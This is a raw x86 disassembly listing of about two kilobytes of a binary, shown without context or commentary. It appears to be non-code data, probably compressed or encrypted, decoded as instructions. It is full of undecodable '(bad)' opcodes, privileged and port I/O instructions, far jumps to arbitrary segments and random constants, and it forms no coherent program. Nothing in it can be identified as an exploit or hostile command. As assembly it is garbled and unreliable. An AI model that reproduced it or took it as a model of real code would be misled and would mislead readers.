  40c5d2:	mov    edx,0x5973931e
  40c5d7:	sub    al,0x63
  40c5d9:	push   edi
  40c5da:	inc    DWORD PTR [eax-0x20]
  40c5dd:	outs   dx,DWORD PTR ds:[esi]
  40c5de:	jmp    0x7a65300e
  40c5e3:	mov    ch,0x6
  40c5e5:	out    0x2b,eax
  40c5e7:	dec    eax
  40c5e8:	mov    edi,0x1fb69dec
  40c5ed:	test   ch,al
  40c5ef:	clc    
  40c5f0:	aad    0x2b
  40c5f2:	mov    ebx,0x1927fd32
  40c5f7:	pop    ebp
  40c5f8:	mov    ds:0x1f26877f,eax
  40c5fd:	outs   dx,DWORD PTR ds:[esi]
  40c5fe:	add    eax,0x8273ffea
  40c603:	sbb    BYTE PTR [eax+0x74ff5602],0xe3
  40c60a:	xchg   edi,eax
  40c60b:	je     0x40c59f
  40c60d:	int3   
  40c60e:	mov    edi,0x3ba1a5bc
  40c613:	pusha  
  40c614:	cmp    BYTE PTR ds:0xd6068ba,bh
  40c61a:	iret   
  40c61b:	mul    edx
  40c61d:	mov    esi,0x8c8c2135
  40c622:	ja     0x40c5cd
  40c624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c625:	add    al,0x87
  40c627:	lds    esi,FWORD PTR [ebx]
  40c629:	sub    BYTE PTR [eax],0xf1
  40c62c:	sub    al,0xc4
  40c62e:	jnp    0x40c5f5
  40c630:	push   edx
  40c631:	push   ecx
  40c632:	ja     0x40c6a9
  40c634:	or     BYTE PTR [ecx-0x41],0x27
  40c638:	mov    edi,0xfd7fb621
  40c63d:	xor    eax,0xcb764edd
  40c642:	lock xor BYTE PTR [esp+eax*4-0x12],ch
  40c647:	adc    BYTE PTR [ecx],bh
  40c649:	mov    bh,0xfa
  40c64b:	sbb    ecx,ebp
  40c64d:	mov    ebx,edi
  40c64f:	sub    DWORD PTR [esi+0x37],ebp
  40c652:	and    DWORD PTR [esi],ebx
  40c654:	mov    ebx,?
  40c656:	adc    eax,0x678ad268
  40c65b:	call   DWORD PTR [ebx]
  40c65d:	jge    0x40c685
  40c65f:	cmp    al,0x5d
  40c661:	xchg   ebp,eax
  40c662:	cli    
  40c663:	fnstcw WORD PTR [edx]
  40c665:	(bad)  
  40c666:	popf   
  40c667:	jmp    0x40c6d7
  40c669:	inc    esp
  40c66a:	or     BYTE PTR [ebx-0x4f],0x88
  40c66e:	jb     0x40c651
  40c670:	ins    DWORD PTR es:[edi],dx
  40c671:	mov    ebp,0xabfe5230
  40c676:	ss sub dh,cl
  40c679:	pop    edi
  40c67a:	cmp    BYTE PTR [ebx+ebp*1],0x85
  40c67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67f:	cld    
  40c680:	loope  0x40c6c0
  40c682:	rcl    DWORD PTR [ebx],1
  40c684:	(bad)  
  40c685:	mov    ds:0x3a9eda5e,al
  40c68a:	cwde   
  40c68b:	cmp    DWORD PTR [esi-0x3],0x4e
  40c68f:	cmp    eax,0xc530a763
  40c694:	pop    eax
  40c695:	mov    cl,BYTE PTR ds:0x59399717
  40c69b:	shl    BYTE PTR [eax+0x70],cl
  40c69e:	sub    BYTE PTR [edi-0x23d20801],ch
  40c6a4:	aas    
  40c6a5:	je     0x40c6cc
  40c6a7:	jg     0x40c6b6
  40c6a9:	cld    
  40c6aa:	or     BYTE PTR [esi+0x6fc25290],bl
  40c6b0:	fadd   st,st(2)
  40c6b2:	inc    ebp
  40c6b3:	cmp    dl,BYTE PTR [esi+0x5d]
  40c6b6:	addr16 mov esp,0x471894f2
  40c6bc:	jge    0x40c703
  40c6be:	call   DWORD PTR [edx+0x2d]
  40c6c1:	rcl    DWORD PTR [ebp-0x4f],cl
  40c6c4:	pop    ecx
  40c6c5:	xchg   ebx,eax
  40c6c6:	add    BYTE PTR [edx],bl
  40c6c8:	(bad)  
  40c6c9:	sbb    DWORD PTR [esi+0x6b],ebp
  40c6cc:	in     al,dx
  40c6cd:	or     DWORD PTR [edx-0x35],esp
  40c6d0:	cmp    ebp,0xffffffa2
  40c6d3:	add    al,BYTE PTR [ebx+0x4e]
  40c6d6:	gs pop ss
  40c6d8:	arpl   bp,ax
  40c6da:	loop   0x40c749
  40c6dc:	jle    0x40c718
  40c6de:	into   
  40c6df:	div    DWORD PTR [edi-0x9]
  40c6e2:	pop    eax
  40c6e3:	pop    esi
  40c6e4:	pop    esp
  40c6e5:	mov    esp,0xd670707a
  40c6ea:	cmp    bl,BYTE PTR [esi]
  40c6ec:	mov    bh,0xc8
  40c6ee:	inc    edx
  40c6ef:	mov    ecx,0xbbf4d60c
  40c6f4:	lock sbb al,0x5a
  40c6f7:	out    0x8f,al
  40c6f9:	(bad)  
  40c6fa:	jle    0x40c747
  40c6fc:	retf   0x8899
  40c6ff:	mov    DWORD PTR [ebp-0x4b],edi
  40c702:	xchg   esi,eax
  40c703:	repnz (bad) 
  40c706:	bound  ebx,QWORD PTR [ebx]
  40c708:	or     BYTE PTR [ebp+0x3f],bl
  40c70b:	mov    ecx,0xf2e39d50
  40c710:	dec    edi
  40c711:	push   ebp
  40c712:	sahf   
  40c713:	mov    BYTE PTR [esp+ebx*8],0xf1
  40c717:	inc    esp
  40c718:	ret    0x6382
  40c71b:	shr    ebp,0xb7
  40c71e:	fst    DWORD PTR [esi+0x65]
  40c721:	jle    0x40c796
  40c723:	sbb    ebx,edi
  40c725:	push   eax
  40c726:	xchg   cl,al
  40c728:	sub    DWORD PTR [edx],eax
  40c72a:	lods   al,BYTE PTR ds:[esi]
  40c72b:	inc    edx
  40c72c:	mov    edx,0xb7b0df20
  40c731:	and    al,ch
  40c733:	aad    0x44
  40c735:	or     DWORD PTR ds:0x900c4bd2,0xffffffb7
  40c73c:	or     eax,0x5e93a369
  40c741:	mov    esi,0x87c1524e
  40c746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c747:	mov    ebp,0xce4009f0
  40c74c:	repnz cmp al,0x80
  40c74f:	loop   0x40c7a5
  40c751:	jmp    0x40c720
  40c753:	mov    esi,cs
  40c755:	mov    al,0x4b
  40c757:	add    ebx,DWORD PTR [edx]
  40c759:	add    al,ch
  40c75b:	sti    
  40c75c:	dec    esp
  40c75d:	mov    DWORD PTR [edx-0x5a],ebx
  40c760:	sbb    dl,ch
  40c762:	(bad)  
  40c764:	fadd   DWORD PTR [edx-0x1ea671ae]
  40c76a:	dec    ebp
  40c76b:	inc    edx
  40c76c:	mov    esp,0x6ff8f83b
  40c771:	sub    BYTE PTR [edx],ah
  40c773:	(bad)  
  40c774:	cld    
  40c775:	ins    BYTE PTR es:[edi],dx
  40c776:	sbb    al,0xa1
  40c778:	cmp    cl,0xc2
  40c77b:	and    cl,BYTE PTR [eax-0x1a]
  40c77e:	adc    edx,DWORD PTR [ebx+0x7b]
  40c781:	pop    ebp
  40c782:	push   ss
  40c783:	ins    BYTE PTR es:[edi],dx
  40c784:	mov    bl,0xa7
  40c786:	test   BYTE PTR [ecx+0x28],0x28
  40c78a:	xchg   edx,eax
  40c78b:	cli    
  40c78c:	(bad)  
  40c78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c78e:	mov    ebp,0xf6bdb2ae
  40c793:	mov    ebx,0x1a96b4c9
  40c798:	pusha  
  40c799:	loop   0x40c79d
  40c79b:	(bad)  
  40c79c:	es test al,0xc1
  40c79f:	repz push ss
  40c7a1:	sub    edi,esp
  40c7a3:	or     ch,BYTE PTR [esi-0x11]
  40c7a6:	fsubr  DWORD PTR [ebx+0x73]
  40c7a9:	mov    al,0xc0
  40c7ab:	loop   0x40c7d4
  40c7ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ae:	or     cl,bh
  40c7b0:	arpl   WORD PTR [edx+ecx*8],cx
  40c7b3:	dec    ebp
  40c7b4:	mov    bh,0x19
  40c7b6:	xchg   edi,eax
  40c7b7:	(bad)  
  40c7b8:	mov    eax,0x74dca78a
  40c7bd:	fcmovne st,st(3)
  40c7bf:	dec    edx
  40c7c0:	xlat   BYTE PTR ds:[ebx]
  40c7c1:	(bad)  
  40c7c2:	xlat   BYTE PTR ds:[ebx]
  40c7c3:	out    0xfa,eax
  40c7c5:	popa   
  40c7c6:	mov    al,0x2
  40c7c8:	sub    eax,0x9f3f8121
  40c7cd:	xor    ch,BYTE PTR [edx+edi*1]
  40c7d0:	retf   
  40c7d1:	xor    ecx,DWORD PTR ds:0xd53cad30
  40c7d7:	sti    
  40c7d8:	fsub   st(1),st
  40c7da:	cs push ebx
  40c7dc:	xor    eax,0x66aa389d
  40c7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7e2:	in     al,0x65
  40c7e4:	fcomi  st,st(2)
  40c7e6:	ja     0x40c80d
  40c7e8:	imul   edx,DWORD PTR [edi-0x42],0x5a
  40c7ec:	int3   
  40c7ed:	jno    0x40c7f0
  40c7ef:	fsub   QWORD PTR [ebp+0x65]
  40c7f2:	inc    esp
  40c7f3:	adc    eax,0x26739b4e
  40c7f8:	and    al,0x3d
  40c7fa:	cwde   
  40c7fb:	xchg   ebx,eax
  40c7fc:	cmpxchg BYTE PTR [ecx+0x7],ch
  40c800:	sbb    al,0x87
  40c802:	imul   ebp,DWORD PTR [ebx+0x76],0x79
  40c806:	mov    WORD PTR ds:0x1bc25647,fs
  40c80c:	fsub   DWORD PTR [edi]
  40c80e:	out    dx,al
  40c80f:	mov    ?,ebp
  40c811:	into   
  40c812:	inc    esi
  40c813:	stc    
  40c814:	push   ebx
  40c815:	push   ss
  40c816:	test   al,0x31
  40c818:	aas    
  40c819:	arpl   WORD PTR [ecx+0x10],cx
  40c81c:	sti    
  40c81d:	in     eax,0x17
  40c81f:	mov    edx,0x79ba1b6b
  40c824:	je     0x40c872
  40c826:	cmp    eax,0xd957d4f8
  40c82b:	jle    0x40c844
  40c82d:	add    bl,dl
  40c82f:	jmp    0xecd5:0x94a23180
  40c836:	and    DWORD PTR ds:0x758c2551,edi
  40c83c:	sub    eax,0x8f80c256
  40c841:	adc    ecx,esp
  40c843:	jbe    0x40c884
  40c845:	mov    esi,0xeaab2ae8
  40c84a:	imul   ebp,DWORD PTR [ebp+0x69b1b393],0xffffffce
  40c851:	ret    0x2b29
  40c854:	xchg   BYTE PTR [ecx+0x6ee13e01],al
  40c85a:	jecxz  0x40c870
  40c85c:	cld    
  40c85d:	rcr    BYTE PTR [esi-0x272da533],cl
  40c863:	sti    
  40c864:	or     ebx,DWORD PTR [eax+ecx*8]
  40c867:	sahf   
  40c868:	iret   
  40c869:	out    0x30,al
  40c86b:	inc    edx
  40c86c:	xor    DWORD PTR [eax+0x5a],ebx
  40c86f:	dec    esp
  40c870:	in     al,0x29
  40c872:	int    0x13
  40c874:	clc    
  40c875:	and    eax,edi
  40c877:	out    dx,eax
  40c878:	ret    
  40c879:	fpatan 
  40c87b:	ror    DWORD PTR [ebp+0x6d],cl
  40c87e:	cmp    dl,ch
  40c880:	jmp    0x57904056
  40c885:	iret   
  40c886:	or     dl,BYTE PTR [ebx+0x3ca757d4]
  40c88c:	xor    edx,DWORD PTR [ebp+edi*4-0x1]
  40c890:	fdivr  QWORD PTR [ecx+0x11]
  40c893:	leave  
  40c894:	adc    al,0x69
  40c896:	call   0x54965526
  40c89b:	xchg   edx,eax
  40c89c:	not    BYTE PTR [eax]
  40c89e:	cmp    al,BYTE PTR [edi]
  40c8a0:	jo     0x40c8b8
  40c8a2:	dec    esp
  40c8a3:	aaa    
  40c8a4:	lods   al,BYTE PTR ds:[esi]
  40c8a5:	ja     0x40c855
  40c8a7:	mov    al,0x5c
  40c8a9:	and    ecx,esp
  40c8ab:	enter  0x6802,0xd0
  40c8af:	mov    edi,0xe4ec69c2
  40c8b4:	idiv   BYTE PTR [eax+0x3be30b91]
  40c8ba:	(bad)  
  40c8bc:	std    
  40c8bd:	xor    BYTE PTR [edi-0x21b49fbd],bl
  40c8c3:	ret    0x7446
  40c8c6:	inc    esp
  40c8c7:	popa   
  40c8c8:	xchg   ebp,eax
  40c8c9:	mov    ebx,0xf2a70bf7
  40c8ce:	mov    ebp,0xb7ba1938
  40c8d3:	int    0x64
  40c8d5:	push   esi
  40c8d6:	xchg   ebp,eax
  40c8d7:	mov    esp,DWORD PTR [esi+0x3cc130ce]
  40c8dd:	inc    edx
  40c8de:	lwpins esi,edi,0x82980cc8
  40c8e7:	cmp    ebx,DWORD PTR [edi]
  40c8e9:	xor    BYTE PTR [ecx+0x61],al
  40c8ec:	sub    eax,0x9b772c0
  40c8f1:	adc    DWORD PTR [ebp+0x4385a174],0x3b7c1297
  40c8fb:	in     al,dx
  40c8fc:	aaa    
  40c8fd:	adc    ebx,edx
  40c8ff:	pop    ds
  40c900:	jbe    0x40c948
  40c902:	pushf  
  40c903:	stos   DWORD PTR es:[edi],eax
  40c904:	add    al,0xfb
  40c906:	mov    ch,0x5d
  40c908:	jle    0x40c88d
  40c90a:	int3   
  40c90b:	and    DWORD PTR [eax+0x0],ebp
  40c90e:	jp     0x40c963
  40c910:	adc    eax,0xec0cb2d7
  40c915:	mov    ecx,eax
  40c917:	stc    
  40c918:	enter  0xd37b,0x53
  40c91c:	push   es
  40c91d:	or     ch,BYTE PTR [eax-0x5b]
  40c920:	fidivr DWORD PTR [edi-0x6c5fbf8b]
  40c926:	popa   
  40c927:	ret    0x3ded
  40c92a:	daa    
  40c92b:	jle    0x40c8e1
  40c92d:	and    ch,dh
  40c92f:	retf   
  40c930:	inc    ebp
  40c931:	mov    ecx,DWORD PTR [esi+0x1b]
  40c934:	or     dl,0x79
  40c937:	ins    BYTE PTR es:[edi],dx
  40c938:	or     al,0xff
  40c93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c93b:	cmp    BYTE PTR [ebx-0x5bc6aa66],ch
  40c941:	sub    edi,DWORD PTR [ebx]
  40c943:	mov    bh,0xbc
  40c945:	cwde   
  40c946:	xchg   ebx,eax
  40c947:	pop    edx
  40c948:	jmp    0x40c929
  40c94a:	outs   dx,BYTE PTR ds:[esi]
  40c94b:	fisttp WORD PTR [edi-0x5]
  40c94e:	sub    al,0x8
  40c950:	mov    dl,BYTE PTR [ebx+0xc]
  40c953:	xchg   ebp,eax
  40c954:	and    al,0x64
  40c956:	jbe    0x40c8e7
  40c958:	mov    eax,ds:0x558ddeee
  40c95d:	fild   DWORD PTR ds:0x7259365a
  40c963:	jecxz  0x40c975
  40c965:	push   ecx
  40c966:	push   ecx
  40c967:	mov    al,0x7b
  40c969:	std    
  40c96a:	sub    eax,0x9e8c4fef
  40c96f:	jl     0x40c9e8
  40c971:	ror    bl,0x56
  40c974:	xchg   ebx,eax
  40c975:	and    DWORD PTR [eax-0xa94b862],0x93d4fe05
  40c97f:	das    
  40c980:	jmp    0xf239:0x63226373
  40c987:	sbb    esi,ebp
  40c989:	lahf   
  40c98a:	fldenv [ebx+0x70]
  40c98d:	dec    ebx
  40c98e:	inc    esi
  40c98f:	sti    
  40c990:	rcr    cl,0xdc
  40c993:	scas   al,BYTE PTR es:[edi]
  40c994:	jae    0x40c925
  40c996:	pop    ebx
  40c997:	or     edx,DWORD PTR [edi+0x6c0f443e]
  40c99d:	sti    
  40c99e:	mov    eax,ds:0x88678c9
  40c9a3:	mov    BYTE PTR [ebx],ch
  40c9a5:	inc    esi
  40c9a6:	or     DWORD PTR [eax-0x50547518],ebx
  40c9ac:	into   
  40c9ad:	mov    esp,0xc004b799
  40c9b2:	adc    DWORD PTR [ebx+edi*4+0x1568b685],ebp
  40c9b9:	add    edx,ebx
  40c9bb:	outs   dx,DWORD PTR ds:[esi]
  40c9bc:	call   0x6958:0x6dd40abd
  40c9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c4:	ins    BYTE PTR es:[edi],dx
  40c9c5:	js     0x40ca2c
  40c9c7:	and    eax,0x6d34f01e
  40c9cc:	xchg   ebx,eax
  40c9cd:	mov    BYTE PTR [edx+esi*1+0x17],bh
  40c9d1:	fidiv  DWORD PTR [edi+0x5e]
  40c9d4:	pop    edi
  40c9d5:	dec    esi
  40c9d6:	cdq    
  40c9d7:	push   ecx
  40c9d8:	in     eax,0xff
  40c9da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9db:	push   esi
  40c9dc:	ins    DWORD PTR es:[edi],dx
  40c9dd:	arpl   WORD PTR [edx],sp
  40c9df:	enter  0xd48a,0x7b
  40c9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e4:	mov    esi,0x5606568e
  40c9e9:	lds    esi,FWORD PTR [edi]
  40c9eb:	fisub  DWORD PTR [esi-0x2a]
  40c9ee:	call   0x9fbc7f0a
  40c9f3:	and    al,0xd1
  40c9f5:	fwait
  40c9f6:	into   
  40c9f7:	push   di
  40c9f9:	aam    0x8
  40c9fb:	adc    BYTE PTR [ebp+ecx*2-0x9430f22],cl
  40ca02:	push   ecx
  40ca04:	xchg   BYTE PTR [ecx],ah
  40ca06:	jp     0x40c9f2
  40ca08:	(bad)  
  40ca09:	mov    edi,0x49eb0c30
  40ca0e:	lea    eax,[edx]
  40ca10:	xor    edi,DWORD PTR [edx-0x4bdcaf83]
  40ca16:	das    
  40ca17:	ror    al,0xa6
  40ca1a:	ins    DWORD PTR es:[edi],dx
  40ca1b:	ret    
  40ca1c:	dec    esp
  40ca1d:	scas   al,BYTE PTR es:[edi]
  40ca1e:	mov    ebp,0x5348addf
  40ca23:	rcr    BYTE PTR [ebx-0x50],1
  40ca26:	neg    BYTE PTR [eax+ebp*4]
  40ca29:	ins    BYTE PTR es:[edi],dx
  40ca2a:	xor    DWORD PTR [ebx+ebp*8+0x6d3e6083],0x77a0253b
  40ca35:	es loop 0x40ca44
  40ca38:	xor    edx,DWORD PTR [esi-0x5688f173]
  40ca3e:	sbb    al,0x71
  40ca40:	pop    eax
  40ca41:	popa   
  40ca42:	inc    ecx
  40ca43:	xchg   esp,eax
  40ca44:	or     esi,DWORD PTR [ebp+0x435c9dcd]
  40ca4a:	rcr    BYTE PTR [ebp+0xc79546f],0xc2
  40ca51:	sbb    eax,0x638d7e6c
  40ca56:	sbb    DWORD PTR [ebx-0x2b],ebp
  40ca59:	daa    
  40ca5a:	test   DWORD PTR [ebx],0xecc2456d
  40ca60:	or     BYTE PTR [eax-0x5c],al
  40ca63:	out    0x79,eax
  40ca65:	arpl   sp,dx
  40ca67:	mov    eax,ds:0x83eedff4
  40ca6c:	push   eax
  40ca6d:	xchg   edx,eax
  40ca6e:	out    dx,eax
  40ca6f:	lds    ecx,FWORD PTR [edx]
  40ca71:	fdivr  DWORD PTR [eax+0x6a6bec87]
  40ca77:	xchg   esi,eax
  40ca78:	jp     0x40cada
  40ca7a:	imul   esi,DWORD PTR [ebx],0x67
  40ca7d:	add    eax,0x793e8f0c
  40ca82:	mov    ebx,DWORD PTR [ecx]
  40ca84:	add    edi,DWORD PTR [edi-0x35d535e6]
  40ca8a:	imul   bl
  40ca8c:	and    DWORD PTR [ecx],0x2c0cbe2c
  40ca92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca93:	mov    ebp,0x7929ca23
  40ca98:	aaa    
  40ca99:	lahf   
  40ca9a:	sar    BYTE PTR ds:0xd5a79386,1
  40caa0:	push   ss
  40caa1:	into   
  40caa2:	fs pop edx
  40caa4:	jbe    0x40ca3c
  40caa6:	pusha  
  40caa7:	sub    eax,0x44ef9317
  40caac:	mov    eax,0xccb7be46
  40cab1:	xchg   esi,eax
  40cab2:	pop    edi
  40cab3:	push   ebx
  40cab4:	fscale 
  40cab6:	pop    ebp
  40cab7:	mov    ebx,0x93cd982b
  40cabc:	test   BYTE PTR [ebx+0x31],dl
  40cabf:	xor    edi,DWORD PTR [ecx-0x61]
  40cac2:	lds    ebp,FWORD PTR [ebp+0x51]
  40cac5:	adc    al,0xd1
  40cac7:	jbe    0x40ca70
  40cac9:	push   eax
  40caca:	add    BYTE PTR [ebx-0x2c],al
  40cacd:	imul   ebx,DWORD PTR [bx+si+0x28],0x75ef19cb
  40cad5:	outs   dx,DWORD PTR ds:[esi]
  40cad6:	mov    ecx,0x8b988927
  40cadb:	jl     0x40caea
  40cadd:	adc    al,BYTE PTR [esi-0x3f]
  40cae0:	loopne 0x40cb30
  40cae2:	xlat   BYTE PTR ds:[ebx]
  40cae3:	jae    0x40cb2a
  40cae5:	push   esp
  40cae6:	sbb    al,0x4d
  40cae8:	inc    edx
  40cae9:	iret   
  40caea:	xchg   edx,eax
  40caeb:	hlt    
  40caec:	push   es
  40caed:	add    BYTE PTR [edx+0x110b6bc],ch
  40caf3:	js     0x40cb63
  40caf5:	ins    DWORD PTR es:[edi],dx
  40caf6:	shr    BYTE PTR [esi-0x6e],1
  40caf9:	lea    ebp,[esi+0x493dd269]
  40caff:	pusha  
  40cb00:	mov    esi,0xec1ff684
  40cb05:	jle    0x40cb4d
  40cb07:	popa   
  40cb08:	mov    esi,0xb3a14a36
  40cb0d:	stc    
  40cb0e:	das    
  40cb0f:	jle    0x40cb20
  40cb11:	pop    ebp
  40cb12:	data16 jp 0x40cb5e
  40cb15:	int3   
  40cb16:	test   DWORD PTR [ebx],edi
  40cb18:	fld    QWORD PTR cs:[eax+0x521f2f0f]
  40cb1f:	dec    ebp
  40cb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb21:	mov    al,ds:0xcea23eea
  40cb26:	push   edx
  40cb27:	sub    eax,0xa572ce4f
  40cb2c:	fst    QWORD PTR [esi+eax*4]
  40cb2f:	mov    eax,ds:0x16fd4840
  40cb34:	xchg   ebp,eax
  40cb35:	fcom   DWORD PTR [ecx]
  40cb37:	or     edi,ecx
  40cb39:	add    cl,BYTE PTR [edi+0xd]
  40cb3c:	aam    0x1d
  40cb3e:	cmp    al,0x5e
  40cb40:	shl    DWORD PTR [eax],0x1f
  40cb43:	xlat   BYTE PTR ds:[ebx]
  40cb44:	push   ss
  40cb45:	sub    dl,bl
  40cb47:	sysret 
  40cb49:	mov    al,0x36
  40cb4b:	daa    
  40cb4c:	lods   eax,DWORD PTR ds:[esi]
  40cb4d:	and    ah,cl
  40cb4f:	pop    es
  40cb50:	addr16 push ebx
  40cb52:	sbb    BYTE PTR [edi-0x28],dh
  40cb55:	ds dec eax
  40cb57:	xor    BYTE PTR [eax+0x1a],bl
  40cb5a:	mov    bl,0xbf
  40cb5c:	nop
  40cb5d:	test   eax,0xf3b7388c
  40cb62:	inc    edx
  40cb63:	mov    edx,0xce053d5c
  40cb68:	mov    WORD PTR [eax+0x55e44334],?
  40cb6e:	dec    esi
  40cb6f:	xchg   edx,eax
  40cb70:	push   ds
  40cb71:	mov    ds:0x5e43a621,eax
  40cb76:	(bad)  
  40cb77:	jb     0x40cb0d
  40cb79:	add    ch,BYTE PTR [ebx-0x5924eedb]
  40cb7f:	push   esi
  40cb80:	(bad)  
  40cb82:	jnp    0x40cb85
  40cb84:	setg   BYTE PTR [edx-0x6a]
  40cb88:	shl    BYTE PTR [ebp-0x2dc0688],0x67
  40cb8f:	fnstenv [eax+0x63]
  40cb92:	sub    bl,bh
  40cb94:	aaa    
  40cb95:	repz rol DWORD PTR [edi],0xa3
  40cb99:	add    edi,eax
  40cb9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb9c:	pop    ecx
  40cb9d:	icebp  
  40cb9e:	mov    bh,0xe6
  40cba0:	sbb    ebx,DWORD PTR [esi+0x359770cd]
  40cba6:	stc    
  40cba7:	and    BYTE PTR [ecx+0x79],0x87
  40cbab:	xor    cl,BYTE PTR [ecx+0x2d]
  40cbae:	jnp    0x40cb79
  40cbb0:	cmp    eax,0x3aa88302
  40cbb5:	and    eax,0xa6a62225
  40cbba:	fnstenv [edi-0x4d]
  40cbbd:	lods   al,BYTE PTR ds:[esi]
  40cbbe:	sahf   
  40cbbf:	pop    ss
  40cbc0:	imul   eax,DWORD PTR [eax-0x175c553e],0xeb7b0213
  40cbca:	pop    es
  40cbcb:	sti    
  40cbcc:	sub    eax,0xfcaeaaa3
  40cbd1:	int    0xb0
  40cbd3:	ss pop edx
  40cbd5:	or     eax,0xe
  40cbd8:	jb     0x40cc1c
  40cbda:	mov    edi,0xbc99473f
  40cbdf:	adc    BYTE PTR [ebx+0x5d],bl
  40cbe2:	stos   DWORD PTR es:[edi],eax
  40cbe3:	mov    dh,0xd
  40cbe5:	adc    eax,0x6c8b7511
  40cbea:	or     BYTE PTR [edi-0x73d68e2c],dh
  40cbf0:	mov    cl,0x8b
  40cbf2:	sub    eax,0x14572b53
  40cbf7:	sbb    al,0x3c
  40cbf9:	mov    bl,0xca
  40cbfb:	or     ch,BYTE PTR [esi]
  40cbfd:	es shl edi,0x7
  40cc01:	xor    DWORD PTR [eax+0x72c28f42],ebx
  40cc07:	add    ch,BYTE PTR [ebx]
  40cc09:	test   BYTE PTR [edi],ch
  40cc0b:	sub    al,0xac
  40cc0d:	sbb    edx,DWORD PTR [ecx]
  40cc0f:	nop
  40cc10:	cmp    dh,cl
  40cc12:	call   0xf7685491
  40cc17:	mov    esp,0xcabc8a67
  40cc1c:	scas   al,BYTE PTR es:[edi]
  40cc1d:	inc    ebx
  40cc1e:	jnp    0x40cc36
  40cc20:	push   esp
  40cc21:	in     eax,0x13
  40cc23:	stos   BYTE PTR es:[edi],al
  40cc24:	ins    BYTE PTR es:[edi],dx
  40cc25:	jle    0x40cc23
  40cc27:	and    esi,DWORD PTR [eax-0x634eb5e6]
  40cc2d:	out    dx,al
  40cc2e:	aaa    
  40cc2f:	inc    ebp
  40cc30:	les    esi,FWORD PTR [edi]
  40cc32:	es pop ss
  40cc34:	lahf   
  40cc35:	xchg   ebx,eax
  40cc36:	ret    0xe919
  40cc39:	(bad)  
  40cc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc3b:	push   ecx
  40cc3c:	iret   
  40cc3d:	xchg   ebp,eax
  40cc3e:	xor    BYTE PTR [edi],cl
  40cc40:	mov    ds:0x603497c6,al
  40cc45:	or     DWORD PTR [ecx-0x6aaa1664],ecx
  40cc4b:	inc    esi
  40cc4c:	cmp    BYTE PTR [ecx],0x86
  40cc4f:	(bad)  
  40cc50:	cmc    
  40cc51:	cmc    
  40cc52:	mov    ds,WORD PTR [ecx+0x42]
  40cc55:	push   ds
  40cc56:	mov    al,0xeb
  40cc58:	pop    es
  40cc59:	mov    eax,0x80356c73
  40cc5e:	xor    BYTE PTR [ebp+0x66],ch
  40cc61:	fnstsw WORD PTR [ecx+0x4c]
  40cc64:	mov    DWORD PTR [esi],esi
  40cc66:	push   0xffffffb6
  40cc68:	add    eax,0xfc6fe4bd
  40cc6d:	cmp    DWORD PTR [edx-0x3a],ebp
  40cc70:	pop    esi
  40cc71:	(bad)  
  40cc72:	xor    eax,0x14285711
  40cc77:	cmp    dh,ah
  40cc79:	or     ebp,DWORD PTR [esi+ebp*1+0x1f]
  40cc7d:	(bad)  
  40cc7e:	shl    DWORD PTR [edi-0x35],1
  40cc81:	xchg   edx,eax
  40cc82:	retf   0x141a
  40cc85:	inc    eax
  40cc86:	fisttp QWORD PTR [edx]
  40cc88:	jb     0x40cc1f
  40cc8a:	ins    DWORD PTR es:[edi],dx
  40cc8b:	addr16 rcr ebx,1
  40cc8e:	add    DWORD PTR [edi-0x7c],eax
  40cc91:	(bad)  
  40cc92:	loope  0x40cc92
  40cc94:	push   ds
  40cc95:	cmp    edi,DWORD PTR [ecx]
  40cc97:	loop   0x40cc72
  40cc99:	add    eax,0x890bb6e1
  40cc9e:	mov    esp,DWORD PTR [esi+0x72b7e5c]
  40cca4:	xchg   edx,eax
  40cca5:	mov    dl,0xb5
  40cca7:	push   edi
  40cca8:	mov    esp,0xcd7b1348
  40ccad:	xchg   ecx,eax
  40ccae:	mov    ebx,0xc7afa7b6
  40ccb3:	xor    ch,ah
  40ccb5:	frstor [edi+0x23bae5d1]
  40ccbb:	neg    DWORD PTR [edi+0x3395d2a3]
  40ccc1:	jns    0x40ccfc
  40ccc3:	cs cmp al,bl
  40ccc6:	shr    ch,cl
  40ccc8:	ins    BYTE PTR es:[edi],dx
  40ccc9:	mov    bh,0x2b
  40cccb:	pop    edx
  40cccc:	mov    ebp,0xdc2f9b31
  40ccd1:	xor    DWORD PTR [ebp+0x4b],esp
  40ccd4:	and    eax,0xddca39ad
  40ccd9:	mov    BYTE PTR [ebp-0x17],ch
  40ccdc:	(bad)  
  40ccdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccde:	mov    bh,0xba
  40cce0:	bound  esp,QWORD PTR [ebx]
  40cce2:	ret    0x5752
  40cce5:	test   BYTE PTR [eax-0x6b4b2f3a],ah
  40cceb:	sbb    edx,DWORD PTR [edi-0x577bb1b0]
  40ccf1:	fadd   QWORD PTR [edi]
  40ccf3:	or     BYTE PTR [ecx+0x66],bl
  40ccf6:	mov    ds:0xfdcad2fc,al
  40ccfb:	jecxz  0x40cd69
  40ccfd:	xor    eax,0x1c6b5dc7
  40cd02:	mov    edi,DWORD PTR [edx-0x11]
  40cd05:	aad    0xa6
  40cd07:	test   al,0x69
  40cd09:	stos   BYTE PTR es:[edi],al
  40cd0a:	mov    bh,0x4d
  40cd0c:	fiadd  DWORD PTR [ebx+0x39f7b838]
  40cd12:	es hlt 
  40cd14:	mov    cl,0xc
  40cd16:	mov    ds:0x7c1de62d,eax
  40cd1b:	add    eax,0x7907fff0
  40cd20:	scas   eax,DWORD PTR es:[edi]
  40cd21:	or     ebp,edx
  40cd23:	jp     0x40ccd2
  40cd25:	mov    esi,0x8a144057
  40cd2a:	in     al,0x61
  40cd2c:	shl    DWORD PTR [ecx],0xea
  40cd2f:	ja     0x40cd78
